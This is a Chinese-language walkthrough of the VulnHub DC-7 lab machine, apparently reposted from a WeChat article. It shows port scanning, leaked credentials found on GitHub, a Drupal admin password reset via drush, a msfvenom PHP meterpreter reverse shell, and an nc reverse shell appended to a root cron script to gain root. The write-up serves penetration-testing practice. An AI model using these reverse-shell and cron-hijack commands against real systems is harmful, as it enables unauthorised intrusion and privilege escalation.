# vulnhub之dc7的实践

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzA3MjM5MDc2Nw==&mid=2650745740&idx=1&sn=e43fd564a999df19f5cb10c645aea516&chksm=87148a8cb063039af38d27d417d6ab1c5a4a606854b7784f7e6e3d92ab914bf22dac79c61447&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MzA3MjM5MDc2Nw==&mid=2650745740&idx=1&sn=e43fd564a999df19f5cb10c645aea516&chksm=87148a8cb063039af38d27d417d6ab1c5a4a606854b7784f7e6e3d92ab914bf22dac79c61447&scene=27#wechat_redirect)

本周实践的是vulnhub的dc7镜像，下载地址，https://download.vulnhub.com/dc/DC-7.zip，

启动靶机，既然地址直接告诉了，就省的地址扫描了，

![](../Images/8b825ec99c20d7805dd7da882baacb42.png)

端口扫描，sudo nmap -sS -sV -T4 -A -p- 192.168.137.46，

![](../Images/27b463687069e12d8b832820ecbd6084.png)

访问web服务，看到服务叫Drupal，DC7USER定制的，

![](../Images/ccb3fdf5e5c49ab582ca387067dd8afa.png)

上网搜DC7USER，发现有个github项目，GitHub - Dc7User/staffdb，

![](../Images/d95c60814c3769ba6515ee48386d30b3.png)

从这个项目里找到了一个config.php文件，

https://github.com/Dc7User/staffdb/blob/master/config.php，

里面有用户名密码，dc7user/MdR3xOgB7#dW，

试了一下，无法登录web服务，但是可以ssh进入靶机，不是root，也无法sudo，接下来就得想办法提权了，

![](../Images/cb8d41879bff71878660884078a0b643.png)

cat /var/mail/dc7user，发现了有定时任务，

执行的是/opt/scripts/backups.sh，

![](../Images/fbf2a3f3d788905243b61631b0ff212c.png)

发现定时任务里还执行了drush sql-dump --result-file=/home/dc7user/backups/website.sql，

继续在网上搜，发现drush命令是可以修改网站管理员的密码的，

https://drushcommands.com/drush-8x/user/user-password/，

![](../Images/090c5659ff6d0b79b96b1bf1136916ad.png)

按照定时任务里的操作，先进入/var/www/html/目录，

然后直接修改admin账户的密码，

drush user-password admin --password="newpassword"，

![](../Images/ada16af1b0f4c2e509e96c8c87fa4068.png)

这就可以登录web服务了，

![](../Images/07cf4658ac6cc1cf156520532ace3c31.png)

继续在网上搜，看看网站是否存在上传web shell的方法，

drupal reverse-shell，发现几个有用的链接，第一个和第三个非常给力，

https://www.sevenlayers.com/index.php/164-drupal-to-reverse-shell，

https://sevenlayers.com/index.php/257-drupal-8-to-reverse-shell，

![](../Images/4c1f1667b00b10d603df1463825abf03.png)

按照提示，先去下载php模块，

https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz，安装php模块，

![](../Images/9573189bec4625982389cc1efcf6bccc.png)

使能php模块，Enable newly added modules，

![](../Images/fedb9bf3e6f51e2611a45537621e1d8a.png)

在kali攻击机上做一个web shell脚本，

sudo msfvenom -p php/meterpreter/reverse\_tcp LHOST=192.168.137.2 LPORT=4444 R，

![](../Images/50d4f235e52e451d40dc0be22b195877.png)

添加内容，新建一个基本页面，选择php code，把脚本贴到body里，

![](../Images/186f9c638e4ad01a10a47f2fdea95277.png)

在kali攻击机上开个监听，

use exploit/multi/handler  
set payload php/meterpreter/reverse\_tcp  
set lhost 192.168.137.2  
set lport 4444  
run  

预览新添加的页面，  

![](../Images/d0106124844080939a32159fabb09c1d.png)

meterpreter shell就过来了，虽然拿到的账户不是root，但是www-data也不错，因为上文中看到www-data账户对/opt/scripts/backups.sh也有可写权限，

![](../Images/24adc93a34ebe75703035dfe56f52588.png)

这就可以再继续添加反弹shell了，

先切到普通shell，再升级成交互式的，

python -c 'import pty;pty.spawn("/bin/bash")'，

把反弹shell脚本写进/opt/scripts/backups.sh，

echo "nc 192.168.137.2 4445 -e /bin/bash" >> /opt/scripts/backups.sh

![](../Images/2e4f1b26175a19a0accdbeab985e0a37.png)  

在kali攻击机上再用nc开个监听，sudo nc -nlvp 4445，

等个大概20分钟吧，shell就过来了，确认是root，

![](../Images/b31a2794c38ca44cf2658412ac58640d.png)

至此拿root权限成功。
